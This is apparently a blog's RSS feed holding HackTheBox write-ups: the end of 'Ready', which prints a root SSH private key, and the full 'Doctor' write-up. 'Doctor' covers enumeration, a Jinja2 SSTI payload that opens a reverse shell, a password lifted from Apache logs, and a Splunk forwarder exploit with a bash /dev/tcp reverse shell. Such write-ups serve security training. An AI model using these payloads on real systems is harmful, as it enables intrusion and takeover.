+-rw------- 1 root root 1675 Dec  7 16:49 id_rsa
+-rw-r--r-- 1 root root  405 Dec  7 16:49 id_rsa.pub
+root@gitlab:/media# cat iamf/root/.ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
+sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
+6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf
+YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX
+TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W
+rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011
+YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof
+Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf
+iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+
+lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab
+VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu
+K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL
+g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2
+3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy
+n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8
+kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1
+KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff
+Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B
+MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab
+dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v
+DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa
+bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r
+ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv
+aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz
+vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
+-----END RSA PRIVATE KEY-----
+</code></pre></div><h4 id="ssh-access---root-host">SSH Access - root (host)</h4>
+<p>After changing the key permissions to 600, I can login as root user.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «ssh-key» «10.10.14.20» 
+$ chmod 600 root_rsa 
+→ root@kali «ssh-key» «10.10.14.20» 
+$ ssh -i root_rsa root@10.10.10.220
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)
+
+...&lt;SNIP&gt;..
+  System load:                      0.05
+  Usage of /:                       67.1% of 17.59GB
+  Memory usage:                     84%
+  Swap usage:                       4%
+  Processes:                        434
+  Users logged in:                  0
+  IPv4 address for br-bcb73b090b3f: 172.19.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for ens160:          10.10.10.220
+  IPv6 address for ens160:          dead:beef::250:56ff:feb9:211
+
+...&lt;SNIP&gt;..
+Last login: Thu Feb 11 14:28:18 2021
+root@ready:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@ready:~# ls -l
+total 16
+drwxr-xr-x  3 root root 4096 Dec  1 12:41 docker-gitlab
+drwxr-xr-x 10 root root 4096 Jul  9  2020 ready-channel
+-r--------  1 root root   33 Jul  8  2020 root.txt
+drwxr-xr-x  3 root root 4096 May 18  2020 snap
+</code></pre></div><p>I can also grab the root flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@ready:~# cut -c-15 root.txt 
+b7f98681505cd39
+</code></pre></div><hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/</a></li>
+<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Doctor</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-doctor/</link>
+      <pubDate>Sat, 08 May 2021 23:21:45 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-doctor/</guid>
+      <description>Seven times seven is equal to SSTI</description>
+      <content:encoded><![CDATA[<p>Doctor is an easy difficulty Windows machine from HackTheBox that features a Flask web application which is vulnerable to blind Server-Side Template Injection. I&rsquo;m able to gain a foothold using the SSTI vulnerability. Enumerating on the Apache log files discovers a user&rsquo;s password. The user credentials are work on the Splunk Universal Forwarder service, which can be exploited to gain root access using PySplunkWhisperer2.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Server Side Template Injection</li>
+<li>Splunk UF Exploitation</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>
+<p>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></p>
+</li>
+<li>
+<p>Nmap - Preinstalled in Kali Linux</p>
+</li>
+<li>
+<p>Gobuster - <a href="https://github.com/OJ/gobuste">https://github.com/OJ/gobuste</a></p>
+</li>
+<li>
+<p>Tplmap - <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
+</li>
+<li>
+<p>SSTI Cheatsheet - <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#</a></p>
+</li>
+<li>
+<p>PySplunkWhisperer2 - <a href="https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py">https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py</a></p>
+</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>An initial scans discovers three open ports: SSH on port 22, HTTP server on port 80, and a Splunk daemon on port 8089 backed with HTTPS.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «exploits» «10.10.14.3»
+$ mkdir nmap; nmap -sC -sV -oN nmap/initial-doctor <span style="color:#e6db74">&#39;10.10.10.209&#39;</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.209
+Host is up <span style="color:#f92672">(</span>0.055s latency<span style="color:#f92672">)</span>.
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp   open  http     Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+| http-methods:
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Doctor
+8089/tcp open  ssl/http Splunkd httpd
+| http-methods:
+|_  Supported Methods: GET HEAD OPTIONS
+| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry
+|_/
+|_http-server-header: Splunkd
+|_http-title: splunkd
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SplunkServerDefaultCert/organizationName<span style="color:#f92672">=</span>SplunkUser
+| Issuer: commonName<span style="color:#f92672">=</span>SplunkCommonCA/organizationName<span style="color:#f92672">=</span>Splunk/stateOrProvinceName<span style="color:#f92672">=</span>CA/countryName<span style="color:#f92672">=</span>US
+| Public Key type: rsa
+| Public Key bits: <span style="color:#ae81ff">2048</span>
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-09-06T15:57:27
+| Not valid after:  2023-09-06T15:57:27
+| MD5:   db23 4e5c 546d <span style="color:#ae81ff">8895</span> 0f5f 8f42 5e90 <span style="color:#ae81ff">6787</span>
+|_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>This page shows a kind of health service website called &ldquo;Doctor&rdquo; in the title.</p>
+<p><img class="img-container" src="imgs/image-20210509010426119.png" alt="image-20210509010426119"  />
+</p>
+<h4 id="gobuster">Gobuster</h4>
+<p>URL brute force with <code>gobuster</code> didn&rsquo;t find any interesting results.</p>
+<pre><code>/images               (Status: 301) [Size: 313] [--&gt; http://10.10.10.209/images/]
+/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.10.209/js/]
+/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.10.209/css/]
+/contact.html         (Status: 200) [Size: 19848]
+/blog.html            (Status: 200) [Size: 19848]
+/about.html           (Status: 200) [Size: 19848]
+/index.html           (Status: 200) [Size: 19848]
+/services.html        (Status: 200) [Size: 19848]
+/fonts                (Status: 301) [Size: 312] [--&gt; http://10.10.10.209/fonts/]
+/departments.html     (Status: 200) [Size: 19848]
+/server-status        (Status: 403) [Size: 277]
+/index.html           (Status: 200) [Size: 19848]
+</code></pre><h3 id="tcp-80---doctorshtb">TCP 80 - doctors.htb</h3>
+<p>Because adding a machine name with &ldquo;.htb&rdquo; as TLD to <code>/etc/hosts</code> file has become my habit (i.e <code>doctor.htb</code>), so at first, on the homepage, I didn&rsquo;t notice that there is an additional &ldquo;s&rdquo; on <code>info@doctors.htb</code>.</p>
+<p><img class="img-container" src="imgs/image-20210509011106327.png" alt="image-20210509011106327"  />
+</p>
+<p>Once I added <code>doctors.htb</code> to my <code>/etc/hosts</code> file, I refreshed the page with that hostname, and it presented a different web application.</p>
+<p><img class="img-container" src="imgs/image-20210509011333267.png" alt="image-20210509011333267"  />
+</p>
+<p>In the page source, I found a comment telling that the archive feature is still in beta testing.</p>
+<p><img class="img-container" src="imgs/image-20210509013716799.png" alt="image-20210509013716799"  />
+</p>
+<p>I&rsquo;ll note that <code>/archive</code>.</p>
+<h4 id="gobuster-1">Gobuster</h4>
+<p>I ran another gobuster scan, but it seems I&rsquo;ll just register an account this time.</p>
+<pre><code>/logout               (Status: 302) [Size: 217] [--&gt; http://doctors.htb/home]
+/register             (Status: 200) [Size: 4493]
+/login                (Status: 200) [Size: 4204]
+/home                 (Status: 302) [Size: 245] [--&gt; http://doctors.htb/login?next=%2Fhome]
+/archive              (Status: 200) [Size: 101]
+/account              (Status: 302) [Size: 251] [--&gt; http://doctors.htb/login?next=%2Faccount]
+/server-status        (Status: 403) [Size: 276]
+</code></pre><p>My account is only available for 20 minutes.</p>
+<p><img class="img-container" src="imgs/image-20210509014205880.png" alt="image-20210509014205880"  />
+</p>
+<p>The &ldquo;1&rdquo; icon was actually a page number with URL of <code>http://doctors.htb/home?page=1</code>.</p>
+<h3 id="tcp-8089--splunk-universal-forwarder">TCP 8089  —  Splunk Universal Forwarder</h3>
+<p>I can visit the Splunk UF on port 8089 through the browser after adding HTTPS to the URL and accepting the SSL certificate warning.</p>
+<p>At the top, I can see the Splunk version.</p>
+<p><img class="img-container" src="imgs/image-20210509014443695.png" alt="image-20210509014443695"  />
+</p>
+<h4 id="finding-vulnerability">Finding vulnerability</h4>
+<p>Knowing the version, I did a quick search on Google to look for available exploits, and I came across <code>hackbooktriks.xyz</code></p>
+<ul>
+<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence">https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence</a></li>
+</ul>
+<p>The original research was published in here:</p>
+<ul>
+<li><a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/</a></li>
+</ul>
+<p>But it requires credentials. I&rsquo;ll just add this to my to do list.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-web">Shell as web</h3>
+<h4 id="sql-injection---failed">SQL Injection - Failed</h4>
+<p>I can create a post message on <code>doctors.htb</code> by visiting <a href="http://doctors.htb/post/new">http://doctors.htb/post/new</a>. Below is the example request</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTTP" data-lang="HTTP"><span style="color:#a6e22e">POST</span> /post/new <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">doctors.htb</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://doctors.htb/post/new</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">35</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=.eJwlzj0OwjAMQOG7eGZI7MSJe5kq_hOsLZ0Qd6cS69Mbvg_secT5hO19XPGA_eWwQRMSDJdkRrMYOFNNMZvRdM5gth6jkLulV3JtOS1EFOsQGlNMDDXW_VN37GFzmbaGrWhiFq-r91aVlGWsdMV1ByYeZfJShBtynXH8NQjfH00QMJk.YBo8Bw.h165pwEGvKjGaPS-d3RiIO-xe34</span>
+Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+
+title=test&amp;content=test&amp;submit=Post
+</code></pre></div><p>I fed the request to <code>SQLMap</code>, but it doesn&rsquo;t seem injectable.</p>
+<p>And then I looked into Wapplyzerーa web plugin that can be used to identify the technology stacks behind a websiteー, and it shows <code>doctors.htb</code> uses Flask as its backend.</p>
+<p><img class="img-container" src="imgs/136d4a7725d44c5a9de3b53bd18bfdb9.png" alt="136d4a7725d44c5a9de3b53bd18bfdb9"  />
+</p>
+<h4 id="server-side-template-injection-ssti">Server Side Template Injection (SSTI)</h4>
+<p>Web applications that use Python Flask are typically run with a templating engine such as Jinja. On every templating engine, SSTI can occur when an un-sanitized user input is passed directly into the application templating process.</p>
+<blockquote>
+<p>PwnFunction’s video on <a href="https://www.youtube.com/watch?v=SN6EVIG4c-0">SSTI</a> was very informative.</p>
+<p>TryHackMe also has a room called “<a href="https://tryhackme.com/room/flask">Flask</a>” that contains an example of SSTI attack on Flask. I have completed that room, and  the note is available on my <a href="https://github.com/fahmifj/TryHackMe-notes/tree/main/flask">GitHub</a>.</p>
+</blockquote>
+<p>Here is the methodology to detect SSTI (taken from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology">here</a>):</p>
+<p><img class="img-container" src="imgs/serverside.png" alt="SSTI cheatsheet workflow"  />
+</p>
+<p><code>http://doctors.htb/home?page=1</code> is the first attack surface to target. I used a tool called <code>Tplmap.py</code> to automatically detect SSTI, but no luck.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «exploits» «10.10.14.3»
+$ python tplmap.py -u <span style="color:#e6db74">&#39;http://doctors.htb/home?page=iamf&#39;</span>                             
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Tplmap 0.5
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Testing <span style="color:#66d9ef">if</span> GET parameter <span style="color:#e6db74">&#39;page&#39;</span> is injectable
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Smarty plugin is testing rendering with tag <span style="color:#e6db74">&#39;*&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Smarty plugin is testing blind injection
+...&lt;SNIP&gt;...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Ruby plugin is testing blind injection
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Ejs plugin is testing rendering with tag <span style="color:#e6db74">&#39;*&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Ejs plugin is testing blind injection
+<span style="color:#f92672">[</span>!<span style="color:#f92672">][</span>checks<span style="color:#f92672">]</span> Tested parameters appear to be not injectable.
+</code></pre></div><p>The second attack surface is <code>http://doctors.htb/post/new</code>, which allows me to create a post message. It consists of two input vectors: the title and the content/message.</p>
+<p><img class="img-container" src="imgs/image-20210509023608857.png" alt="image-20210509023608857"  />
+</p>
+<p>I copied the basic SSTI payloads for Jinja2 from PayloadAllTheThings to the post content, but it doesn&rsquo;t return the expected result.</p>
+<p><img class="img-container" src="imgs/image-20210509024048415.png" alt="image-20210509024048415"  />
+</p>
+<p>It returns nothing as well when I submit the payloads on the title.</p>
+<p>After hours trying to figure out why it doesn&rsquo;t work, I noticed that the <code>/archive</code> page occasionally returns an error after I put some payload that has the percentage symbol <code>{% payload %}</code> on the content/message section.</p>
+<p><img class="img-container" src="imgs/image-20210509024504730.png" alt="image-20210509024504730"  />
+</p>
+<p>Or sometimes it only has the post title that can be seen only from page source.</p>
+<p><img class="img-container" src="imgs/image-20210509024707956.png" alt="image-20210509024707956"  />
+</p>
+<p>So from there, I submitted the basic payload on the title.</p>
+<p><img src="imgs/image-20210509025456790.png" alt="image-20210509025456790" style="zoom:50%;" /></p>
+<p>Right after inserting the payload, I checked the page source of <code>/archive</code>, and I found the SSTI expected result there.</p>
+<p><img class="img-container" src="imgs/image-20210509025854497.png" alt="image-20210509025854497"  />
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>The cheat-sheet from PayloadAllTheThings also contains a pre-crafted payload to get a reverse shell. All I have to do now is replace the IP address with mine and have my <code>nc</code> listener listening on the port I specified.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;warning&#34;</span> <span style="color:#f92672">in</span> x<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">%</span>}{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">10.10.14.4</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">-i</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">]);&#39;&#34;</span>)}}{<span style="color:#f92672">%</span>endif<span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+</code></pre></div><p>I have an interactive shell now.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «doctor» «10.10.14.3» 
+$ nc -nvlp <span style="color:#ae81ff">9000</span>            
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.34<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.209<span style="color:#f92672">]</span> <span style="color:#ae81ff">5628</span>
+/bin/sh: 0: can’t access tty; job control turned off
+$ which python
+$ which python3
+/usr/bin/python3
+$ python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+web@doctor:~$ id
+uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>web<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>web<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>web<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-shaun">Shell as shaun</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p>These are the users who a shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">web@doctor:~$ cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/bash
+web:x:1001:1001:,,,:/home/web:/bin/bash
+shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash
+splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
+</code></pre></div><p>Because <code>web</code> is a member of the <code>adm</code> group, I can read the log files at <code>/var/log</code>. While enumerating with <code>find</code> command, I caught an Apache2 log called &ldquo;backup&rdquo;.</p>
+<pre><code>web@doctor:~$ find / -type f -readable -group adm 2&gt;/dev/null
+/var/log/kern.log.3.gz
+/var/log/auth.log
+/var/log/syslog
+/var/log/ufw.log.2.gz
+/var/log/dmesg.2.gz
+/var/log/auth.log.1
+...&lt;SNIP&gt;...
+/var/log/apache2/backup
+</code></pre><p>Searching string &ldquo;pass&rdquo; on the backup log finds this line.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">web@doctor:/var/log/apache2$ cat backup | grep pass
+10.10.14.4 - - <span style="color:#f92672">[</span>05/Sep/2020:11:17:34 +2000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;POST /reset_password?email=Guitar123&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">453</span> <span style="color:#e6db74">&#34;http://doctor.htb/reset_password&#34;</span>
+</code></pre></div><p>It printed as <code>email=Guitar123</code>, but it doesn&rsquo;t look like an email.</p>
+<h4 id="su---shaun">SU - shaun</h4>
+<p>It turns out that <code>Guitar123</code> is shaun&rsquo;s password.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">web@doctor:/var/log/apache2$ su shaun
+Password: Guitar123
+web@doctor:/var/log/apache2$ id
+uid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>shaun<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>shaun<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>shaun<span style="color:#f92672">)</span>
+</code></pre></div><p>User flag is done here.</p>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="exploiting-splunk-with-pysplunkwhisperer2">Exploiting Splunk with PySplunkWhisperer2</h4>
+<p>Recall the Splunk Forwarder, which by BookHackTrick is categorized as a privilege escalation vector.</p>
+<p>The researcher stated that the Splunk UF agent&rsquo;s username is always admin.</p>
+<blockquote>
+<p>Universal Forwarder is accessible on each host at https://host:8089. Accessing any of the protected API calls, such as /service/ pops up a  Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 &hellip;</p>
+</blockquote>
+<p>But that&rsquo;s not the case on this machine, because I can use <code>shaun:Guitar123</code> to authenticate to the Splunk UF services on port 8089.</p>
+<p>I tried <a href="https://github.com/cnotin/SplunkWhisperer2">this PoC</a> from GitHub using the bash reverse shell as payload,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «exploits» «10.10.14.3»
+$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port <span style="color:#ae81ff">8089</span> --username shaun --password Guitar123 --payload <span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.3/9001 0&gt;&amp;1&#39;&#34;</span> --lhost 10.10.14.3
+Running in remote mode <span style="color:#f92672">(</span>Remote Code Execution<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span> Authenticating...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Authenticated
+<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span> Creating malicious app bundle...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Created malicious app bundle in: /tmp/tmpkwnss3rw.tar
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Started HTTP server <span style="color:#66d9ef">for</span> remote mode
+<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span> Installing app from: http://10.10.14.3:8181/
+10.10.10.209 - - <span style="color:#f92672">[</span>03/Feb/2021 05:09:23<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> App installed, your code should be running now!
+</code></pre></div><p>and it worked smoothly.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «doctor» «10.10.14.3» 
+$ nc -nvlp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.209] 48834
+bash: cannot set terminal process group (1137): Inappropriate ioctl for device
+bash: no job control in this shell
+root@doctor:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div><p>I can grab the root flag.</p>
+<p><img class="img-container" src="imgs/image-20210509042058603.png" alt="image-20210509042058603"  />
+</p>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2</a></li>
+<li><a href="https://www.youtube.com/watch?v=SN6EVIG4c-0">https://www.youtube.com/watch?v=SN6EVIG4c-0</a></li>
+<li><a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
   </channel>
 </rss>
